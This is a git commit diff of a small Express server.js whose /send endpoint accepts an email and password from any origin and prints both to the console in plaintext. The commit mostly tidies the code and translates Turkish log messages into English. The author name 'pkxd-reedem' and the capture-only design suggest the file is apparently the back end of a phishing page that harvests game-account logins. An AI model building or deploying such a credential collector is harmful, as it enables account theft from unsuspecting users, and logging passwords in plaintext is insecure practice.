4e4f951b6dad9ac0b6124058f744bf8d2201b72d
pkxd-reedem <im.ardaqw@gmail.com>
2026-01-12 18:51:21 +0300

    Update server.js

--- server.js
+++ server.js
@@ -1,21 +1,18 @@
+// server.js örnek
 const express = require("express");
-const cors = require("cors");
-
 const app = express();
+const cors = require("cors");
 
 app.use(cors());
 app.use(express.json());
 
+const PORT = process.env.PORT || 3000;
+
 app.post("/send", (req, res) => {
   const { email, password } = req.body;
-
-  console.log("Gelen veri:");
-  console.log("Email:", email);
-  console.log("Şifre:", password);
-
+  console.log("EMAIL:", email);
+  console.log("PASSWORD:", password);
   res.sendStatus(200);
 });
 
-app.listen(3000, () => {
-  console.log("Server çalışıyor: http://localhost:3000");
-});
+app.listen(PORT, () => console.log("Server running on port", PORT));
